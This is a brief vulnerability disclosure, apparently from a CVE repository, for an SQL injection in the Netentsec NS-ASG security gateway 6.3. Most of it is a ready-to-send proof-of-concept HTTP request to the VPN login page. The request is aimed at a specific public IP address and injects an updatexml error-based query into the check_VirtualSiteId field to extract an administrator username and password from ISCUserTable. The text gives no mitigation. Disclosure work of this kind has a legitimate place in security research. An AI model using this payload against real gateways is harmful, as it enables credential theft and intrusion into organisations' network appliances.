Beijing Wangkang Technology Co., Ltd. is a leading provider of network application management equipment in China, focusing on the latest trend research and analysis in the field of network application management. It provides users with advanced network application management technology, products, and solutions, aiming to help users achieve the goal of "using the internet well" in network management.

There is an SQL injection vulnerability in the Netcom NS-ASG application security gateway. Attackers exploit vulnerabilities to cause harm to servers.

official： https://www.netentsec.com/

version:6.3

```
POC：
POST /vpnweb/index.php?para=index HTTP/1.1
Host: 1.85.53.53
Cookie: PHPSESSID=ef8b794249b78ad974d5db4f4fde5aba
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/109.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Accept-Encoding: gzip, deflate
Content-Type: application/x-www-form-urlencoded
Content-Length: 288
Upgrade-Insecure-Requests: 1
Sec-Fetch-Dest: document
Sec-Fetch-Mode: navigate
Sec-Fetch-Site: same-origin
Sec-Fetch-User: ?1
X-Forwarded-For: 127.0.0.1
Te: trailers
Connection: close

check_username=admin&check_username1=1&check_passwd=321&action=login_check&check_VirtualSiteId=1/**/and/**/1=(updatexml(1,concat(0x5e24,(select/**/concat(username,0x3a,password)/**/from/**/ISCUserTable/**/limit/**/1),0x5e24),1))#&imgcode=undefined&selvalue=2&BackgroundName=background.gif


```
<img width="621" alt="image" src="https://github.com/flyyue2001/cve/assets/88701694/8fcb680a-8ba6-4c74-b339-97f70bcb35bc">

